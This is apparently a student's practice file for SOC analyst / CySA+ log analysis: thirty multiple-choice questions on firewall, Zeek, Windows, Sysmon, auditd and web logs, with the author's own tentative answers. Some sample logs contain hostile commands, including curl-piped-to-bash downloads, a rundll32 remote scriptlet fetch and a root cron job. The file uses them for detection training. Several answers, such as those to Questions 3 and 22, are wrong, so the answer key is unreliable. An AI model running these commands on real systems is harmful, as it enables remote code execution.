==============================
004-technical-log-questions.txt
Author: ViliusDevX
Purpose: CySA+ / SOC Analyst Technical Log Practice
Difficulty: Hard / Weird / Technical
==============================

!!!RAW ANSWERS ONLY — KEEP MISTAKES AND UNCERTAINTY!!!

==================================================
SECTION 1 — TECHNICAL LOG QUESTIONS (30)
==================================================


Question 1

Evaluate the following Linux firewall log:

Jan 14 03:21:44 web1 kernel: iptables INPUT DROP IN=eth0 OUT= MAC=00:0c:29:aa:bb:cc:00:50:56:dd:ee:ff:08:00 SRC=172.16.4.25 DST=172.16.4.10 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=43121 DF PROTO=TCP SPT=49222 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0

Which of the following statements is TRUE?

A. The host blocked an inbound SSH connection attempt
B. The host allowed an outbound SSH connection attempt
C. The packet was dropped because DNS filtering blocked it
D. The packet represents an established SSH session

My Answer:


A, because of "INPUT DROP" that means failed, but i don't see any evidence for DNS filtering blocking packet

--------------------------------------------------


Question 2

Evaluate the following Linux firewall log:

Feb 02 11:18:03 lx-fw kernel: iptables OUTPUT DROP IN= OUT=eth0 SRC=10.8.1.44 DST=198.51.100.22 LEN=52 TOS=0x00 PREC=0x00 TTL=64 ID=22017 DF PROTO=TCP SPT=49812 DPT=4444 WINDOW=29200 RES=0x00 SYN URGP=0

What does this log MOST likely indicate?

A. An inbound packet to port 4444 was dropped
B. An outbound TCP connection attempt to port 4444 was blocked
C. A UDP DNS query was blocked
D. A successful reverse shell was established

My Answer:

B, destination is public ip and src is private, meaning outbound connection, destination port is 4444, and there is only SYN, no ACK in handshake

--------------------------------------------------


Question 3

A firewall log contains the following:

PROTO=TCP SPT=3389 DPT=51532 SYN ACK

Which statement is MOST accurate?

A. The source host is initiating an RDP connection
B. The source host is responding from RDP to a client ephemeral port
C. The destination host is listening on port 3389
D. The packet is UDP traffic from an RDP server

My Answer:

A, because port 3389 is RDP


--------------------------------------------------


Question 4

Evaluate the following log:

Jun 18 09:45:12 fw01 kernel: DROP IN=eth1 OUT= MAC=... SRC=203.0.113.77 DST=10.0.2.15 PROTO=TCP SPT=56123 DPT=25 SYN

Which service was the external host attempting to reach?

A. DNS
B. SSH
C. SMTP
D. SMB

My Answer:

C, because 25 is SMPT port

--------------------------------------------------


Question 5

A packet log shows:

SRC=10.10.5.20 DST=10.10.5.1 PROTO=UDP SPT=68 DPT=67

Which activity is MOST likely occurring?

A. DHCP client request to DHCP server
B. DNS response from recursive resolver
C. Kerberos authentication to domain controller
D. NTP time synchronization

My Answer:

A, because 68 is DHCP client and 67 is DHCP server ports

--------------------------------------------------


Question 6

A packet log shows:

SRC=10.10.5.1 DST=10.10.5.20 PROTO=UDP SPT=67 DPT=68

Which activity is MOST likely occurring?

A. DHCP server response to client
B. DNS tunneling
C. SSH brute force attempt
D. SMB file transfer

My Answer:

A, because its same as 5th question just in reverse.

--------------------------------------------------


Question 7

A Zeek dns.log entry contains:

query: aHR0cHM6Ly9leGZpbC5leGFtcGxl.com
qtype_name: TXT
answers: <none>
uid: C8a9k11

Why is this suspicious?

A. TXT records can be used to transfer encoded data through DNS
B. TXT records are always malicious
C. The query proves ARP spoofing occurred
D. DNS TXT queries only occur during DHCP negotiation

My Answer:

Not sure on this one but i guess A, because it makes more sense compared to other ones (hesitating with D too)

--------------------------------------------------


Question 8

A Zeek conn.log entry shows:

id.orig_h=10.2.3.44 id.resp_h=198.51.100.80 id.resp_p=443 proto=tcp service=ssl duration=0.15 orig_bytes=85 resp_bytes=120 history=S

What does the history value MOST likely indicate?

A. A complete TLS session with data transfer
B. A connection attempt with SYN but no full establishment
C. A DNS query over TCP
D. A successful SSH login

My Answer:

B, because history=S means packet was seen but connection never finished

--------------------------------------------------


Question 9

A Zeek conn.log entry shows:

id.orig_h=10.0.4.15 id.resp_h=203.0.113.9 id.resp_p=80 proto=tcp service=http history=ShADadF

Which interpretation is BEST?

A. The connection likely completed a normal TCP handshake and exchanged data
B. The traffic was definitely encrypted
C. The connection only sent a SYN and nothing else
D. The host performed DNS tunneling

My Answer:

A, because in zeek conn.log documentation i saw that in "history" value "ShADadF" - "D" means that originator sent at least one segment with payload data, so its normal TCP handshake + some data


--------------------------------------------------


Question 10

A Suricata alert shows:

alert http any any -> any any (msg:"ET WEB_SERVER Possible SQL Injection Attempt UNION SELECT"; content:"UNION"; http_uri; content:"SELECT"; http_uri; sid:100001;)

Which log field would BEST validate whether the payload was in the requested URL?

A. http_user_agent
B. http_uri
C. tls.sni
D. dns.rrname

My Answer:

I guess B but skipping for now

--------------------------------------------------


Question 11

A web server log shows:

192.0.2.55 - - [12/May/2026:04:44:10 +0000] "GET /index.php?page=../../../../etc/passwd HTTP/1.1" 200 1803

What attack is MOST likely being attempted?

A. SQL injection
B. Directory traversal / local file inclusion
C. Cross-site request forgery
D. DNS rebinding

My Answer:

B, because of directory specifications

--------------------------------------------------


Question 12

A web server log shows:

198.51.100.23 - - "GET /search?q=<script>alert(1)</script> HTTP/1.1" 200

Which vulnerability is MOST likely being tested?

A. Reflected XSS
B. SQL injection
C. Path traversal
D. Kerberoasting

My Answer:

A, because of <script> tag

--------------------------------------------------


Question 13

A Windows Security log shows:

Event ID: 4624
Logon Type: 3
Account Name: svc_app
Source Network Address: 10.0.8.55

What does Logon Type 3 generally indicate?

A. Interactive console login
B. Network logon
C. Remote interactive RDP logon
D. Service startup only

My Answer:

Not sure, guessing B?

--------------------------------------------------


Question 14

A Windows Security log shows:

Event ID: 4624
Logon Type: 10
Account Name: admin01
Source Network Address: 10.0.9.21

What does Logon Type 10 generally indicate?

A. Batch job
B. Remote interactive login, commonly RDP
C. Local console login
D. Anonymous null session

My Answer:

Not sure, guessing B

--------------------------------------------------


Question 15

A Windows Security log shows:

Event ID: 4672
SubjectUserName: backup_svc
Privileges: SeDebugPrivilege, SeImpersonatePrivilege, SeBackupPrivilege

Why is this event important during triage?

A. It shows DNS tunneling was successful
B. It indicates special privileges were assigned to the logon session
C. It confirms the account password was changed
D. It proves the host was patched

My Answer:
B, because 4672 means succesfull privilege upgrade or something similar


--------------------------------------------------


Question 16

A Windows event shows:

Event ID: 7045
Service Name: WinUpdateCheck
Service File Name: C:\\Users\\Public\\updater.exe
Service Type: user mode service
Start Type: auto start

What does this MOST likely indicate?

A. Possible persistence through new service creation
B. Normal DNS resolver restart
C. DHCP lease renewal
D. Failed Kerberos pre-authentication

My Answer:

I guess A

--------------------------------------------------


Question 17

A Windows Security log shows:

Event ID: 4688
New Process Name: C:\\Windows\\System32\\rundll32.exe
Command Line: rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://198.51.100.99/a.sct")

Which technique is MOST likely being used?

A. Living-off-the-land execution using rundll32
B. DHCP starvation
C. SMB signing enforcement
D. DNS zone transfer

My Answer:

Guessing A

--------------------------------------------------


Question 18

A Sysmon Event ID 1 shows:

Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
ParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE
CommandLine: powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand SQBFAFgA...

Which field provides the strongest evidence of malicious parent-child process behavior?

A. Image only
B. ParentImage and CommandLine together
C. UtcTime only
D. ProcessGuid only

My Answer:

B

--------------------------------------------------


Question 19

A Sysmon Event ID 3 shows:

Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
DestinationIp: 203.0.113.77
DestinationPort: 443
Initiated: true

Which interpretation is BEST?

A. PowerShell initiated an outbound HTTPS connection
B. PowerShell received an inbound DNS request
C. A firewall blocked all outbound traffic
D. The destination host initiated RDP

My Answer:

A, because its outbound traffic on HTTPS port

--------------------------------------------------


Question 20

A Linux auth.log shows:

May 21 02:13:10 server sshd[2218]: Failed password for invalid user admin from 203.0.113.50 port 51122 ssh2
May 21 02:13:12 server sshd[2220]: Failed password for invalid user test from 203.0.113.50 port 51124 ssh2
May 21 02:13:15 server sshd[2222]: Failed password for invalid user oracle from 203.0.113.50 port 51126 ssh2

Which activity is MOST likely occurring?

A. SSH username enumeration/brute-force attempt
B. Successful privilege escalation
C. DNS tunneling
D. Normal cron execution

My Answer:

A

--------------------------------------------------


Question 21

A Linux auth.log shows:

sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash

What does this event show?

A. deploy attempted DNS tunneling
B. deploy executed a root shell through sudo
C. deploy renewed a DHCP lease
D. deploy performed an NTP sync

My Answer:

B, because of "sudo: deploy" command and then "USER=root" and "COMMAND=/bin/bash"

--------------------------------------------------


Question 22

An auditd log shows:

type=SYSCALL msg=audit(1716300400.123:411): arch=c000003e syscall=59 success=yes exe="/usr/bin/bash" comm="bash"
type=EXECVE msg=audit(1716300400.123:411): argc=3 a0="bash" a1="-c" a2="curl http://203.0.113.8/p.sh | bash"

Which risk is MOST evident?

A. Remote shell script execution
B. Local printer discovery
C. Kerberos ticket renewal
D. Normal package update using signed repo only

My Answer:

Not sure, maybe D, because there is firstly execution and only then curl

--------------------------------------------------


Question 23

A cron file is discovered:

* * * * * root curl -s http://198.51.100.44/checkin.sh | bash

Why is this suspicious?

A. It executes a remote script every minute as root
B. It only changes the system time
C. It configures DNSSEC
D. It disables all outbound traffic

My Answer:

A seems like correct answer but i would have only guessed it, not explained (mark as incorrect)

--------------------------------------------------


Question 24

An nginx access log shows:

10.1.2.8 - - "POST /api/login HTTP/1.1" 401
10.1.2.8 - - "POST /api/login HTTP/1.1" 401
10.1.2.8 - - "POST /api/login HTTP/1.1" 200

Which interpretation is BEST?

A. Failed authentication attempts followed by successful authentication
B. DNS tunneling through HTTP
C. TLS certificate rotation
D. Static file download

My Answer:

A

--------------------------------------------------


Question 25

An HTTP log shows:

GET /admin HTTP/1.1" 302
GET /login HTTP/1.1" 200

What does the 302 response MOST likely indicate?

A. The user was redirected, likely to login
B. The server returned a forbidden response
C. The request caused a DNS failure
D. The request successfully deleted a file

My Answer:

A

--------------------------------------------------


Question 26

A NetFlow record shows:

src=10.5.4.20 dst=203.0.113.88 dst_port=443 bytes_out=985432100 bytes_in=18210 duration=4200

Which activity should be investigated FIRST?

A. Possible large outbound data transfer/exfiltration
B. Normal DNS lookup
C. DHCP broadcast
D. Local printing

My Answer:

A, because its outbound connection from local to public ip on https port with huge amounts of bytes going out

--------------------------------------------------


Question 27

A TLS log shows:

sni=cdn-update-security.com ja3=72a589da586844d7f0818ce684948eea subject=CN=cdn-update-security.com issuer=Let's Encrypt not_before=2026-05-21

Why is this suspicious in a malware investigation?

A. Recently issued certificate and suspicious update-themed domain may indicate new C2 infrastructure
B. Let’s Encrypt certificates are always malicious
C. TLS SNI proves SQL injection
D. JA3 hashes are only used for DHCP

My Answer:

I think A, but lets mark it as partly correct because im not good at TLS logs yet

--------------------------------------------------


Question 28

A DNS log shows:

query=_ldap._tcp.dc._msdcs.corp.local type=SRV src=10.0.3.55

What is the MOST likely purpose of this query?

A. Domain controller/service discovery in Active Directory
B. DNS tunneling using TXT records
C. SQL injection
D. ICMP scanning

My Answer:

A, because of "ldap" which means lightweight directory access protocol

--------------------------------------------------


Question 29

A Windows Security log shows:

Event ID: 4768
Account Name: user1
Failure Code: 0x18
Client Address: 10.0.4.81

What does repeated 4768 failure code 0x18 MOST commonly suggest?

A. Kerberos pre-authentication failure, often bad password attempts
B. Successful DNS zone transfer
C. Local administrator group creation
D. DHCP scope exhaustion

My Answer:

Mark this as incorrect, i don't know the answer

--------------------------------------------------


Question 30

A Windows Security log shows:

Event ID: 4769
Service Name: MSSQLSvc/db01.corp.local:1433
Ticket Encryption Type: 0x17
Account Name: normal.user

Why might this be suspicious during threat hunting?

A. RC4-encrypted service tickets may be relevant to Kerberoasting investigations
B. It proves DNS tunneling occurred
C. It confirms the server was physically stolen
D. It indicates DHCP starvation

My Answer:

Same as previous, mark incorrect

==============================
END OF FILE
==============================
